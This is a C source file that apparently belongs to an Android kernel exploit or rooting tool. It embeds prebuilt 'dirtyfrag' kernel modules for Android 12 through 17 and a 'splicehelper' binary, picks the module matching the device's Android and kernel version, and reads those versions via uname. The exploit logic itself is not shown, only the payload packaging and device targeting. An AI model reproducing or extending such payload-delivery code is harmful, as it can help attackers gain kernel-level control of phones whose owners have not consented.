#include "payloads.h"

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <sys/utsname.h>

asm(
    ".section .rodata\n"
    ".global dirtyfrag_ko_12_5_10_start\n.global dirtyfrag_ko_12_5_10_end\n"
    "dirtyfrag_ko_12_5_10_start:\n.incbin \"ko/dirtyfrag-android12-5.10.ko\"\ndirtyfrag_ko_12_5_10_end:\n"
    ".global dirtyfrag_ko_13_5_10_start\n.global dirtyfrag_ko_13_5_10_end\n"
    "dirtyfrag_ko_13_5_10_start:\n.incbin \"ko/dirtyfrag-android13-5.10.ko\"\ndirtyfrag_ko_13_5_10_end:\n"
    ".global dirtyfrag_ko_13_5_15_start\n.global dirtyfrag_ko_13_5_15_end\n"
    "dirtyfrag_ko_13_5_15_start:\n.incbin \"ko/dirtyfrag-android13-5.15.ko\"\ndirtyfrag_ko_13_5_15_end:\n"
    ".global dirtyfrag_ko_14_5_15_start\n.global dirtyfrag_ko_14_5_15_end\n"
    "dirtyfrag_ko_14_5_15_start:\n.incbin \"ko/dirtyfrag-android14-5.15.ko\"\ndirtyfrag_ko_14_5_15_end:\n"
    ".global dirtyfrag_ko_15_6_6_start\n.global dirtyfrag_ko_15_6_6_end\n"
    "dirtyfrag_ko_15_6_6_start:\n.incbin \"ko/dirtyfrag-android15-6.6.ko\"\ndirtyfrag_ko_15_6_6_end:\n"
    ".global dirtyfrag_ko_16_6_12_start\n.global dirtyfrag_ko_16_6_12_end\n"
    "dirtyfrag_ko_16_6_12_start:\n.incbin \"ko/dirtyfrag-android16-6.12.ko\"\ndirtyfrag_ko_16_6_12_end:\n"
    ".global dirtyfrag_ko_17_6_18_start\n.global dirtyfrag_ko_17_6_18_end\n"
    "dirtyfrag_ko_17_6_18_start:\n.incbin \"ko/dirtyfrag-android17-6.18.ko\"\ndirtyfrag_ko_17_6_18_end:\n"
    ".global splice_helper_start\n.global splice_helper_end\n"
    "splice_helper_start:\n.incbin \"splicehelper\"\nsplice_helper_end:\n"
);

extern char dirtyfrag_ko_12_5_10_start[], dirtyfrag_ko_12_5_10_end[];
extern char dirtyfrag_ko_13_5_10_start[], dirtyfrag_ko_13_5_10_end[];
extern char dirtyfrag_ko_13_5_15_start[], dirtyfrag_ko_13_5_15_end[];
extern char dirtyfrag_ko_14_5_15_start[], dirtyfrag_ko_14_5_15_end[];
extern char dirtyfrag_ko_15_6_6_start[], dirtyfrag_ko_15_6_6_end[];
extern char dirtyfrag_ko_16_6_12_start[], dirtyfrag_ko_16_6_12_end[];
extern char dirtyfrag_ko_17_6_18_start[], dirtyfrag_ko_17_6_18_end[];

const struct KoImage *select_ko_image(int android_release,
                                      int kernel_major, int kernel_minor) {
    static const struct KoImage images[] = {
        {12, 5, 10, dirtyfrag_ko_12_5_10_start, dirtyfrag_ko_12_5_10_end},
        {13, 5, 10, dirtyfrag_ko_13_5_10_start, dirtyfrag_ko_13_5_10_end},
        {13, 5, 15, dirtyfrag_ko_13_5_15_start, dirtyfrag_ko_13_5_15_end},
        {14, 5, 15, dirtyfrag_ko_14_5_15_start, dirtyfrag_ko_14_5_15_end},
        {15, 6,  6, dirtyfrag_ko_15_6_6_start,  dirtyfrag_ko_15_6_6_end},
        {16, 6, 12, dirtyfrag_ko_16_6_12_start, dirtyfrag_ko_16_6_12_end},
        {17, 6, 18, dirtyfrag_ko_17_6_18_start, dirtyfrag_ko_17_6_18_end},
    };
    for (size_t i = 0; i < sizeof(images) / sizeof(images[0]); i++) {
        if (images[i].android_release == android_release
                && images[i].kernel_major == kernel_major
                && images[i].kernel_minor == kernel_minor)
            return &images[i];
    }
    return NULL;
}

int read_device_versions(int *android_release,
                         int *kernel_major, int *kernel_minor) {
    struct utsname identity;
    if (uname(&identity) != 0
            || sscanf(identity.release, "%d.%d", kernel_major, kernel_minor) != 2)
        return -1;
    const char *marker = strstr(identity.release, "android");
    if (!marker) return -1;
    *android_release = atoi(marker + 7);
    return *android_release > 0 ? 0 : -1;
}
